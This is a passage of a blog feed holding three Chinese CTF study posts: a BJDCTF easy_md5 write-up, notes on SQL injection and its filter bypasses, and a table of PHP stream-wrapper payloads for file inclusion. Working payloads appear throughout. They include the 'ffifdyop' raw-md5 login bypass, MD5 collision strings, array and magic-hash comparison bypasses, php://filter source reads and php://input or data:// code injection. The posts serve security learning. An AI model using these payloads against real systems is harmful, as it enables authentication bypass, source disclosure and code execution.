    <content type="html"><![CDATA[<h1 id="BJDCTF-2020-easy-md5题解"><a href="#BJDCTF-2020-easy-md5题解" class="headerlink" title="[BJDCTF 2020]easy_md5题解"></a><center>[BJDCTF 2020]easy_md5题解</h1><p><img src="/../img/md5/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-07-28%20170034.png"></p><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点:"></a>知识点:</h2><ol><li><em><strong>md5(password,true)</strong></em><br><img src="/../img/md5/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-07-28%20165040.png" alt="图片alt" title="md5用法"></li><li><em><strong>php弱类型匹配或数组绕过</strong></em><br><img src="/../img/md5/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-07-28%20165405.png"></li></ol><p>在响应头得到提示属于SQL注入与md5结合的题目</p><p><code>select * from &#39;admin&#39; where password=md5($pass,true)</code><br>$pass$就是我们上传的$password$，当<code>password=md5($pass,true)</code><br>为真时，前面的<code>select * from &#39;admin&#39;</code>才会进行查询,这里需要用将<code>md5($pass,true)</code>将它转化为<code>&#39;or 1</code></p><p>这里用到一个特殊的字符串$ffifdyop$,</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-symbol">hex:</span> <span class="hljs-number">276</span>f<span class="hljs-number">722736</span><span class="hljs-keyword">c</span><span class="hljs-number">95</span>d<span class="hljs-number">99e921722</span>cf<span class="hljs-number">9</span>ed<span class="hljs-number">621</span><span class="hljs-keyword">c</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">raw:</span> &#x27;<span class="hljs-keyword">or</span>&#x27;<span class="hljs-number">6</span>\xc<span class="hljs-number">9</span>]\<span class="hljs-keyword">x</span><span class="hljs-number">99</span>\xe<span class="hljs-number">9</span><span class="hljs-title">!r</span><span class="hljs-punctuation">,</span>\xf<span class="hljs-number">9</span>\xedb\<span class="hljs-keyword">x</span><span class="hljs-number">1</span><span class="hljs-keyword">c</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">string:</span> &#x27;<span class="hljs-keyword">or</span>&#x27;<span class="hljs-number">6</span>]<span class="hljs-title">!r</span><span class="hljs-punctuation">,</span>b<br></code></pre></td></tr></table></figure><p>$ffifdyop$ 这个字符串被 $md5$ 哈希了之后会变成 $276f722736c95d99e921722cf9ed621c，这个字符串前几位刚好是 $’ or ‘6$而 Mysql 刚好又会把 hex 转成 ascii 解释，因此拼接之后的形式是 <code>select * from &#39;admin&#39; where password=&#39;&#39; or &#39;6xxxxx&#39;</code>，等价于 or 一个永真式，因此相当于万能密码，可以绕过md5()函数。</p><p>$’6xxxx’$在布尔比较中当成真<br>在框中输入$ffifdyop$后跳转到下一个页面<br><img src="/../img/md5/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-07-28%20171038.png"></p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs autoit">&lt;!--<br>$a = $_GET[<span class="hljs-string">&#x27;a&#x27;</span>]<span class="hljs-comment">;</span><br>$b = $_GET[<span class="hljs-string">&#x27;b&#x27;</span>]<span class="hljs-comment">;</span><br><br><span class="hljs-keyword">if</span>($a != $b &amp;&amp; md5($a) == md5($b))&#123;<br>    header(<span class="hljs-string">&#x27;Location: levell14.php&#x27;</span>)<span class="hljs-comment">;</span><br>&#125;<br>--&gt;<br></code></pre></td></tr></table></figure><p>从源代码的注释中可以得知这是一个弱类型比较可以使用数组绕过</p><p>下一组也是使用数组绕过</p><ol><li><p>常规的0e绕过</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs dns">QNKCDZO<br><br><span class="hljs-number">240610708</span><br><br>s878926199a<br><br>s155964671a<br><br>s214587387a<br><br>s214587387a<br></code></pre></td></tr></table></figure><p>这些字符串的 md5 值都是 0e 开头，在 php 弱类型比较中判断为相等</p></li><li><p>数组绕过</p></li></ol><p>如下代码<br><code>var_dump(md5($_GET[&#39;a&#39;]) == md5($_GET[&#39;b&#39;]))</code></p><p>传入</p><p><code>a[]=a&amp;b[]=b </code></p><p>可以看到，MD5一个数组返回了null，null&#x3D;&#x3D;null，成功绕过</p><ol start="3"><li><p>强类型绕过</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit"><span class="hljs-keyword">if</span>((<span class="hljs-built_in">string</span>)$_POST[<span class="hljs-string">&#x27;a&#x27;</span>] !== (<span class="hljs-built_in">string</span>)$_POST[<span class="hljs-string">&#x27;b&#x27;</span>] &amp;&amp; md5($_POST[<span class="hljs-string">&#x27;a&#x27;</span>]) === md5($_POST[<span class="hljs-string">&#x27;b&#x27;</span>]))<br></code></pre></td></tr></table></figure><figure class="highlight wren"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs wren"><span class="hljs-variable">a</span><span class="hljs-operator">=</span><span class="hljs-operator">%</span><span class="hljs-number">4</span>d<span class="hljs-operator">%</span><span class="hljs-variable">c9</span><span class="hljs-operator">%</span><span class="hljs-number">68</span><span class="hljs-operator">%</span><span class="hljs-variable">ff</span><span class="hljs-operator">%</span><span class="hljs-number">0</span>e<span class="hljs-operator">%</span><span class="hljs-variable">e3</span><span class="hljs-operator">%</span><span class="hljs-number">5</span>c<span class="hljs-operator">%</span><span class="hljs-number">20</span><span class="hljs-operator">%</span><span class="hljs-number">95</span><span class="hljs-operator">%</span><span class="hljs-number">72</span><span class="hljs-operator">%</span><span class="hljs-variable">d4</span><span class="hljs-operator">%</span><span class="hljs-number">77</span><span class="hljs-operator">%</span><span class="hljs-number">7</span>b<span class="hljs-operator">%</span><span class="hljs-number">72</span><span class="hljs-operator">%</span><span class="hljs-number">15</span><span class="hljs-operator">%</span><span class="hljs-number">87</span><span class="hljs-operator">%</span><span class="hljs-variable">d3</span><span class="hljs-operator">%</span><span class="hljs-number">6</span>f<span class="hljs-operator">%</span><span class="hljs-variable">a7</span><span class="hljs-operator">%</span><span class="hljs-variable">b2</span><span class="hljs-operator">%</span><span class="hljs-number">1</span>b<span class="hljs-operator">%</span><span class="hljs-variable">dc</span><span class="hljs-operator">%</span><span class="hljs-number">56</span><span class="hljs-operator">%</span><span class="hljs-variable">b7</span><span class="hljs-operator">%</span><span class="hljs-number">4</span>a<span class="hljs-operator">%</span><span class="hljs-number">3</span>d<span class="hljs-operator">%</span><span class="hljs-variable">c0</span><span class="hljs-operator">%</span><span class="hljs-number">78</span><span class="hljs-operator">%</span><span class="hljs-number">3</span>e<span class="hljs-operator">%</span><span class="hljs-number">7</span>b<span class="hljs-operator">%</span><span class="hljs-number">95</span><span class="hljs-operator">%</span><span class="hljs-number">18</span><span class="hljs-operator">%</span><span class="hljs-variable">af</span><span class="hljs-operator">%</span><span class="hljs-variable">bf</span><span class="hljs-operator">%</span><span class="hljs-variable">a2</span><span class="hljs-operator">%</span><span class="hljs-number">00</span><span class="hljs-operator">%</span><span class="hljs-variable">a8</span><span class="hljs-operator">%</span><span class="hljs-number">28</span><span class="hljs-operator">%</span><span class="hljs-number">4</span>b<span class="hljs-operator">%</span><span class="hljs-variable">f3</span><span class="hljs-operator">%</span><span class="hljs-number">6</span>e<span class="hljs-operator">%</span><span class="hljs-number">8</span>e<span class="hljs-operator">%</span><span class="hljs-number">4</span>b<span class="hljs-operator">%</span><span class="hljs-number">55</span><span class="hljs-operator">%</span><span class="hljs-variable">b3</span><span class="hljs-operator">%</span><span class="hljs-number">5</span>f<span class="hljs-operator">%</span><span class="hljs-number">42</span><span class="hljs-operator">%</span><span class="hljs-number">75</span><span class="hljs-operator">%</span><span class="hljs-number">93</span><span class="hljs-operator">%</span><span class="hljs-variable">d8</span><span class="hljs-operator">%</span><span class="hljs-number">49</span><span class="hljs-operator">%</span><span class="hljs-number">67</span><span class="hljs-operator">%</span><span class="hljs-number">6</span>d<span class="hljs-operator">%</span><span class="hljs-variable">a0</span><span class="hljs-operator">%</span><span class="hljs-variable">d1</span><span class="hljs-operator">%</span><span class="hljs-number">55</span><span class="hljs-operator">%</span><span class="hljs-number">5</span>d<span class="hljs-operator">%</span><span class="hljs-number">83</span><span class="hljs-operator">%</span><span class="hljs-number">60</span><span class="hljs-operator">%</span><span class="hljs-variable">fb</span><span class="hljs-operator">%</span><span class="hljs-number">5</span>f<span class="hljs-operator">%</span><span class="hljs-number">07</span><span class="hljs-operator">%</span><span class="hljs-variable">fe</span><span class="hljs-operator">%</span><span class="hljs-variable">a2</span><br><span class="hljs-operator">&amp;</span><span class="hljs-variable">b</span><span class="hljs-operator">=</span><span class="hljs-operator">%</span><span class="hljs-number">4</span>d<span class="hljs-operator">%</span><span class="hljs-variable">c9</span><span class="hljs-operator">%</span><span class="hljs-number">68</span><span class="hljs-operator">%</span><span class="hljs-variable">ff</span><span class="hljs-operator">%</span><span class="hljs-number">0</span>e<span class="hljs-operator">%</span><span class="hljs-variable">e3</span><span class="hljs-operator">%</span><span class="hljs-number">5</span>c<span class="hljs-operator">%</span><span class="hljs-number">20</span><span class="hljs-operator">%</span><span class="hljs-number">95</span><span class="hljs-operator">%</span><span class="hljs-number">72</span><span class="hljs-operator">%</span><span class="hljs-variable">d4</span><span class="hljs-operator">%</span><span class="hljs-number">77</span><span class="hljs-operator">%</span><span class="hljs-number">7</span>b<span class="hljs-operator">%</span><span class="hljs-number">72</span><span class="hljs-operator">%</span><span class="hljs-number">15</span><span class="hljs-operator">%</span><span class="hljs-number">87</span><span class="hljs-operator">%</span><span class="hljs-variable">d3</span><span class="hljs-operator">%</span><span class="hljs-number">6</span>f<span class="hljs-operator">%</span><span class="hljs-variable">a7</span><span class="hljs-operator">%</span><span class="hljs-variable">b2</span><span class="hljs-operator">%</span><span class="hljs-number">1</span>b<span class="hljs-operator">%</span><span class="hljs-variable">dc</span><span class="hljs-operator">%</span><span class="hljs-number">56</span><span class="hljs-operator">%</span><span class="hljs-variable">b7</span><span class="hljs-operator">%</span><span class="hljs-number">4</span>a<span class="hljs-operator">%</span><span class="hljs-number">3</span>d<span class="hljs-operator">%</span><span class="hljs-variable">c0</span><span class="hljs-operator">%</span><span class="hljs-number">78</span><span class="hljs-operator">%</span><span class="hljs-number">3</span>e<span class="hljs-operator">%</span><span class="hljs-number">7</span>b<span class="hljs-operator">%</span><span class="hljs-number">95</span><span class="hljs-operator">%</span><span class="hljs-number">18</span><span class="hljs-operator">%</span><span class="hljs-variable">af</span><span class="hljs-operator">%</span><span class="hljs-variable">bf</span><span class="hljs-operator">%</span><span class="hljs-variable">a2</span><span class="hljs-operator">%</span><span class="hljs-number">02</span><span class="hljs-operator">%</span><span class="hljs-variable">a8</span><span class="hljs-operator">%</span><span class="hljs-number">28</span><span class="hljs-operator">%</span><span class="hljs-number">4</span>b<span class="hljs-operator">%</span><span class="hljs-variable">f3</span><span class="hljs-operator">%</span><span class="hljs-number">6</span>e<span class="hljs-operator">%</span><span class="hljs-number">8</span>e<span class="hljs-operator">%</span><span class="hljs-number">4</span>b<span class="hljs-operator">%</span><span class="hljs-number">55</span><span class="hljs-operator">%</span><span class="hljs-variable">b3</span><span class="hljs-operator">%</span><span class="hljs-number">5</span>f<span class="hljs-operator">%</span><span class="hljs-number">42</span><span class="hljs-operator">%</span><span class="hljs-number">75</span><span class="hljs-operator">%</span><span class="hljs-number">93</span><span class="hljs-operator">%</span><span class="hljs-variable">d8</span><span class="hljs-operator">%</span><span class="hljs-number">49</span><span class="hljs-operator">%</span><span class="hljs-number">67</span><span class="hljs-operator">%</span><span class="hljs-number">6</span>d<span class="hljs-operator">%</span><span class="hljs-variable">a0</span><span class="hljs-operator">%</span><span class="hljs-variable">d1</span><span class="hljs-operator">%</span><span class="hljs-variable">d5</span><span class="hljs-operator">%</span><span class="hljs-number">5</span>d<span class="hljs-operator">%</span><span class="hljs-number">83</span><span class="hljs-operator">%</span><span class="hljs-number">60</span><span class="hljs-operator">%</span><span class="hljs-variable">fb</span><span class="hljs-operator">%</span><span class="hljs-number">5</span>f<span class="hljs-operator">%</span><span class="hljs-number">07</span><span class="hljs-operator">%</span><span class="hljs-variable">fe</span><span class="hljs-operator">%</span><span class="hljs-variable">a2</span><br><br>$<span class="hljs-title class_">Param</span>1<span class="hljs-operator">=</span><span class="hljs-string">&quot;\x4d\xc9<span class="hljs-char escape_">\x68</span>\xff\x0e\xe3\x5c<span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x95</span><span class="hljs-char escape_">\x72</span>\xd4<span class="hljs-char escape_">\x77</span>\x7b<span class="hljs-char escape_">\x72</span><span class="hljs-char escape_">\x15</span><span class="hljs-char escape_">\x87</span>\xd3\x6f\xa7\xb2\x1b\xdc<span class="hljs-char escape_">\x56</span>\xb7\x4a\x3d\xc0<span class="hljs-char escape_">\x78</span>\x3e\x7b<span class="hljs-char escape_">\x95</span><span class="hljs-char escape_">\x18</span>\xaf\xbf\xa2<span class="hljs-char escape_">\x00</span>\xa8<span class="hljs-char escape_">\x28</span>\x4b\xf3\x6e\x8e\x4b<span class="hljs-char escape_">\x55</span>\xb3\x5f<span class="hljs-char escape_">\x42</span><span class="hljs-char escape_">\x75</span><span class="hljs-char escape_">\x93</span>\xd8<span class="hljs-char escape_">\x49</span><span class="hljs-char escape_">\x67</span>\x6d\xa0\xd1<span class="hljs-char escape_">\x55</span>\x5d<span class="hljs-char escape_">\x83</span><span class="hljs-char escape_">\x60</span>\xfb\x5f<span class="hljs-char escape_">\x07</span>\xfe\xa2&quot;</span>;<br>$<span class="hljs-title class_">Param</span>2<span class="hljs-operator">=</span><span class="hljs-string">&quot;\x4d\xc9<span class="hljs-char escape_">\x68</span>\xff\x0e\xe3\x5c<span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\x95</span><span class="hljs-char escape_">\x72</span>\xd4<span class="hljs-char escape_">\x77</span>\x7b<span class="hljs-char escape_">\x72</span><span class="hljs-char escape_">\x15</span><span class="hljs-char escape_">\x87</span>\xd3\x6f\xa7\xb2\x1b\xdc<span class="hljs-char escape_">\x56</span>\xb7\x4a\x3d\xc0<span class="hljs-char escape_">\x78</span>\x3e\x7b<span class="hljs-char escape_">\x95</span><span class="hljs-char escape_">\x18</span>\xaf\xbf\xa2<span class="hljs-char escape_">\x02</span>\xa8<span class="hljs-char escape_">\x28</span>\x4b\xf3\x6e\x8e\x4b<span class="hljs-char escape_">\x55</span>\xb3\x5f<span class="hljs-char escape_">\x42</span><span class="hljs-char escape_">\x75</span><span class="hljs-char escape_">\x93</span>\xd8<span class="hljs-char escape_">\x49</span><span class="hljs-char escape_">\x67</span>\x6d\xa0\xd1\xd5\x5d<span class="hljs-char escape_">\x83</span><span class="hljs-char escape_">\x60</span>\xfb\x5f<span class="hljs-char escape_">\x07</span>\xfe\xa2&quot;</span>;<br><br>$<span class="hljs-variable">data1</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;\xd1<span class="hljs-char escape_">\x31</span>\xdd<span class="hljs-char escape_">\x02</span>\xc5\xe6\xee\xc4<span class="hljs-char escape_">\x69</span>\x3d\x9a<span class="hljs-char escape_">\x06</span><span class="hljs-char escape_">\x98</span>\xaf\xf9\x5c\x2f\xca\xb5<span class="hljs-char escape_">\x07</span><span class="hljs-char escape_">\x12</span><span class="hljs-char escape_">\x46</span>\x7e\xab<span class="hljs-char escape_">\x40</span><span class="hljs-char escape_">\x04</span><span class="hljs-char escape_">\x58</span>\x3e\xb8\xfb\x7f<span class="hljs-char escape_">\x89</span><span class="hljs-char escape_">\x55</span>\xad<span class="hljs-char escape_">\x34</span><span class="hljs-char escape_">\x06</span><span class="hljs-char escape_">\x09</span>\xf4\xb3<span class="hljs-char escape_">\x02</span><span class="hljs-char escape_">\x83</span>\xe4<span class="hljs-char escape_">\x88</span><span class="hljs-char escape_">\x83</span><span class="hljs-char escape_">\x25</span>\xf1<span class="hljs-char escape_">\x41</span>\x5a<span class="hljs-char escape_">\x08</span><span class="hljs-char escape_">\x51</span><span class="hljs-char escape_">\x25</span>\xe8\xf7\xcd\xc9\x9f\xd9\x1d\xbd<span class="hljs-char escape_">\x72</span><span class="hljs-char escape_">\x80</span><span class="hljs-char escape_">\x37</span>\x3c\x5b\xd8<span class="hljs-char escape_">\x82</span>\x3e<span class="hljs-char escape_">\x31</span><span class="hljs-char escape_">\x56</span><span class="hljs-char escape_">\x34</span>\x8f\x5b\xae\x6d\xac\xd4<span class="hljs-char escape_">\x36</span>\xc9<span class="hljs-char escape_">\x19</span>\xc6\xdd<span class="hljs-char escape_">\x53</span>\xe2<span class="hljs-char escape_">\x34</span><span class="hljs-char escape_">\x87</span>\xda<span class="hljs-char escape_">\x03</span>\xfd<span class="hljs-char escape_">\x02</span><span class="hljs-char escape_">\x39</span><span class="hljs-char escape_">\x63</span><span class="hljs-char escape_">\x06</span>\xd2<span class="hljs-char escape_">\x48</span>\xcd\xa0\xe9\x9f<span class="hljs-char escape_">\x33</span><span class="hljs-char escape_">\x42</span>\x0f<span class="hljs-char escape_">\x57</span>\x7e\xe8\xce<span class="hljs-char escape_">\x54</span>\xb6<span class="hljs-char escape_">\x70</span><span class="hljs-char escape_">\x80</span><span class="hljs-char escape_">\x28</span>\x0d\x1e\xc6<span class="hljs-char escape_">\x98</span><span class="hljs-char escape_">\x21</span>\xbc\xb6\xa8<span class="hljs-char escape_">\x83</span><span class="hljs-char escape_">\x93</span><span class="hljs-char escape_">\x96</span>\xf9<span class="hljs-char escape_">\x65</span>\xab\x6f\xf7\x2a<span class="hljs-char escape_">\x70</span>&quot;</span>;<br>$<span class="hljs-variable">data2</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;\xd1<span class="hljs-char escape_">\x31</span>\xdd<span class="hljs-char escape_">\x02</span>\xc5\xe6\xee\xc4<span class="hljs-char escape_">\x69</span>\x3d\x9a<span class="hljs-char escape_">\x06</span><span class="hljs-char escape_">\x98</span>\xaf\xf9\x5c\x2f\xca\xb5<span class="hljs-char escape_">\x87</span><span class="hljs-char escape_">\x12</span><span class="hljs-char escape_">\x46</span>\x7e\xab<span class="hljs-char escape_">\x40</span><span class="hljs-char escape_">\x04</span><span class="hljs-char escape_">\x58</span>\x3e\xb8\xfb\x7f<span class="hljs-char escape_">\x89</span><span class="hljs-char escape_">\x55</span>\xad<span class="hljs-char escape_">\x34</span><span class="hljs-char escape_">\x06</span><span class="hljs-char escape_">\x09</span>\xf4\xb3<span class="hljs-char escape_">\x02</span><span class="hljs-char escape_">\x83</span>\xe4<span class="hljs-char escape_">\x88</span><span class="hljs-char escape_">\x83</span><span class="hljs-char escape_">\x25</span><span class="hljs-char escape_">\x71</span><span class="hljs-char escape_">\x41</span>\x5a<span class="hljs-char escape_">\x08</span><span class="hljs-char escape_">\x51</span><span class="hljs-char escape_">\x25</span>\xe8\xf7\xcd\xc9\x9f\xd9\x1d\xbd\xf2<span class="hljs-char escape_">\x80</span><span class="hljs-char escape_">\x37</span>\x3c\x5b\xd8<span class="hljs-char escape_">\x82</span>\x3e<span class="hljs-char escape_">\x31</span><span class="hljs-char escape_">\x56</span><span class="hljs-char escape_">\x34</span>\x8f\x5b\xae\x6d\xac\xd4<span class="hljs-char escape_">\x36</span>\xc9<span class="hljs-char escape_">\x19</span>\xc6\xdd<span class="hljs-char escape_">\x53</span>\xe2\xb4<span class="hljs-char escape_">\x87</span>\xda<span class="hljs-char escape_">\x03</span>\xfd<span class="hljs-char escape_">\x02</span><span class="hljs-char escape_">\x39</span><span class="hljs-char escape_">\x63</span><span class="hljs-char escape_">\x06</span>\xd2<span class="hljs-char escape_">\x48</span>\xcd\xa0\xe9\x9f<span class="hljs-char escape_">\x33</span><span class="hljs-char escape_">\x42</span>\x0f<span class="hljs-char escape_">\x57</span>\x7e\xe8\xce<span class="hljs-char escape_">\x54</span>\xb6<span class="hljs-char escape_">\x70</span><span class="hljs-char escape_">\x80</span>\xa8\x0d\x1e\xc6<span class="hljs-char escape_">\x98</span><span class="hljs-char escape_">\x21</span>\xbc\xb6\xa8<span class="hljs-char escape_">\x83</span><span class="hljs-char escape_">\x93</span><span class="hljs-char escape_">\x96</span>\xf9<span class="hljs-char escape_">\x65</span>\x2b\x6f\xf7\x2a<span class="hljs-char escape_">\x70</span>&quot;</span>;<br><br></code></pre></td></tr></table></figure><p>进行url解码后的MD5值相等</p></li><li><p>$a&#x3D;&#x3D;md5($a)</p></li></ol><p>0e215962017 的 MD5 值也是由 0e 开头，在 PHP 弱类型比较中相等</p>]]></content>
    
    
    <categories>
      
      <category>刷题日记</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Sql</title>
    <link href="/2024/07/22/Sql/"/>
    <url>/2024/07/22/Sql/</url>
    
    <content type="html"><![CDATA[<h2 id="Sql注入基本步骤"><a href="#Sql注入基本步骤" class="headerlink" title="Sql注入基本步骤"></a><font color = '008000'>Sql注入基本步骤</font></h2><ol><li>查找注入点</li><li>判断是字符型还是数字型注入 and 1&#x3D;1 and 1&#x3D;2 &#x2F; 3-1</li><li>如果是字符型判断他的闭合方式, ‘ “ ‘) “)</li><li>判断数据列数 group by &#x2F; order by</li><li>寻找回显位置</li></ol><hr><h2 id="相关命令"><a href="#相关命令" class="headerlink" title="相关命令"></a><font color = '008000'>相关命令</font></h2><ol><li><code>database()</code></li><li><code>group_concat()</code></li><li><code>concat()</code></li><li><code>substring(),00,30</code></li></ol><hr><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a><font color = '008000'>报错注入</font></h2>   <figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">extractvalue</span><span class="hljs-params">(XML_document,XPath_string)</span></span><br><br><span class="hljs-function"><span class="hljs-title">updatexml</span><span class="hljs-params">(XML_document,XPath_string,new_value)</span></span><br></code></pre></td></tr></table></figure><h3 id="floor报错"><a href="#floor报错" class="headerlink" title="floor报错"></a><font color = '808044'>floor报错</font></h3><table><thead><tr><th>涉及函数</th><th>作用</th></tr></thead><tbody><tr><td>rand()</td><td>随机生成0~1之间的小数</td></tr><tr><td>floor()</td><td>小数向下取整数。向上取整数ceiling()</td></tr><tr><td>concat_ws()</td><td>将括号内数据用第一个字段连接起来</td></tr><tr><td>group_by</td><td>分组语句，常用于，结合统计函数，根据一个或多个列对结果集进行分组</td></tr><tr><td>as</td><td>别名</td></tr><tr><td>count()</td><td>汇总统计数量</td></tr><tr><td>limit</td><td>这里用于显示指定行数</td></tr></tbody></table><p>盲注通常会用到以下几个关键字:</p><p>字符串截取类（substr）、条件判断类（if）、语句分割类（空格、&#x2F;**&#x2F;）、逻辑运算类（and、or）</p><h2 id="字符串截取类"><a href="#字符串截取类" class="headerlink" title="字符串截取类"></a><strong>字符串截取类</strong></h2><p>禁用：<code>substr、left、right、mid</code></p><p>绕过： <code>like、rlike、instr</code></p><p>其中like与rlike的区别是 rlike支持正则表达式，而like只支持如%，_等有限的通配符，like可以近似于”&#x3D;”</p><h2 id="语句分割"><a href="#语句分割" class="headerlink" title="语句分割"></a><strong>语句分割</strong></h2><p>禁用： 空格、r(%0d)、n(%0a)、t(%09)、&#x2F;**&#x2F;</p><p>语句之间分割常常使用空格</p><p>绕过： %a0（&amp;nbsp）、%0b(垂直制表符)、%0c（换页符）</p><h2 id="逻辑运算"><a href="#逻辑运算" class="headerlink" title="逻辑运算"></a><strong>逻辑运算</strong></h2><p>禁用： and、or、&#x3D;、&gt;、&lt;、regexp</p><p>绕过： &amp;&amp;、||、 like、greatest、least</p><h2 id="条件判断"><a href="#条件判断" class="headerlink" title="条件判断"></a><strong>条件判断</strong></h2><p>禁用： 因为禁用了,，所以if 语句没法使用</p><p>exp()函数除了能用在报错注入以外，利用exp在参数大于709时会报错的特性可以用来构造条件判断语句</p><p>即如果 <code>(... rlike ...)</code> 中的语句执行匹配后的结果为<code>True</code>，经过减号转换后为 <code>exp(710-1)</code> 后不会溢出；若为<code>false</code>，转换为 <code>exp(710-0)</code> 后则会溢出并报错</p>]]></content>
    
    
    <categories>
      
      <category>知识点</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>php伪协议</title>
    <link href="/2024/06/09/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/"/>
    <url>/2024/06/09/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/</url>
    
    <content type="html"><![CDATA[<table><thead><tr><th align="center">协议</th><th align="center">测试PHP版本</th><th align="center">allow_url_fopen</th><th align="center">allow_url_include</th><th align="center">用法</th></tr></thead><tbody><tr><td align="center"><a href="#file">file:&#x2F;&#x2F;</a></td><td align="center">&gt;&#x3D;5.2</td><td align="center">off&#x2F;on</td><td align="center">off&#x2F;on</td><td align="center">?file&#x3D;file:&#x2F;&#x2F;D:&#x2F;soft&#x2F;phpStudy&#x2F;WWW&#x2F;phpcode.txt</td></tr><tr><td align="center">php:&#x2F;&#x2F;filter</td><td align="center">&gt;&#x3D;5.2</td><td align="center">off&#x2F;on</td><td align="center">off&#x2F;on</td><td align="center">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;.&#x2F;index.php<or>php:&#x2F;&#x2F;filter&#x2F;convert.iconv.UTF-7.UCS-4*&#x2F;resource</td></tr><tr><td align="center"><a href="#Input">php:&#x2F;&#x2F;input</a></td><td align="center">&gt;&#x3D;5.2</td><td align="center">off&#x2F;on</td><td align="center">on</td><td align="center">?fle&#x3D;php:&#x2F;&#x2F;input 【POST DATA】<?php phpinfo()?></td></tr><tr><td align="center">zip:&#x2F;&#x2F;</td><td align="center">&gt;&#x3D;5.2</td><td align="center">off&#x2F;on</td><td align="center">off&#x2F;on</td><td align="center">?file&#x3D;zip:&#x2F;&#x2F;D:&#x2F;soft&#x2F;phpStudy&#x2F;WWW&#x2F;file.zip%23phpcode.txt</td></tr><tr><td align="center">compress.bzip2:&#x2F;&#x2F;</td><td align="center">&gt;&#x3D;5.2</td><td align="center">off&#x2F;on</td><td align="center">off&#x2F;on</td><td align="center">?hle&#x3D;compress.bzip2:&#x2F;&#x2F;D&#x2F;softphpStudy&#x2F;VW&#x2F;hle.bz2</br>【or】</br>?file&#x3D;compress.bzip2:&#x2F;&#x2F;&#x2F;file.bz2</td></tr><tr><td align="center">compress.zlib:&#x2F;&#x2F;</td><td align="center">&gt;&#x3D;5.2</td><td align="center">off&#x2F;on</td><td align="center">off&#x2F;on</td><td align="center">?file&#x3D;compress.zlib:&#x2F;&#x2F;D:&#x2F;soft&#x2F;phpStudy&#x2F;WW&#x2F;file.gz【or】?file&#x3D;compress.zlib:&#x2F;&#x2F;.&#x2F;file.gz</td></tr><tr><td align="center">data:&#x2F;&#x2F;</td><td align="center">&gt;&#x3D;5.2</td><td align="center">on</td><td align="center">on</td><td align="center">?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<?php phpinfo0?></br>【or】</br>?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgcGhwaWSmbygpPz4&#x3D;</br>也可以:?file&#x3D;data:text&#x2F;plain,<?php phpinfo0?></br>【or】</br>?file&#x3D;datatext&#x2F;plain:base64.PD9waHAgcGhwaW5mbyqpPz4&#x3D;</td></tr></tbody></table><hr><h2 id="Input"><a href="#Input" class="headerlink" title="Input"></a>Input</h2><p><em>file</em>为待传的变量名</br><br>变量名&#x3D;php:&#x2F;&#x2F;input然后post想运行的语句</br><br>场景:文件包含</br><br>建议使用burpsuite</br></p><h2 id="file"><a href="#file" class="headerlink" title="file"></a>file</h2><p>用于访问服务端本地的文件</br><br>用法：变量&#x3D;file:&#x2F;&#x2F;文件地址</br><br>场景:文件包含</p>]]></content>
    
    
    
    <tags>
      
      <tag>学习php</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
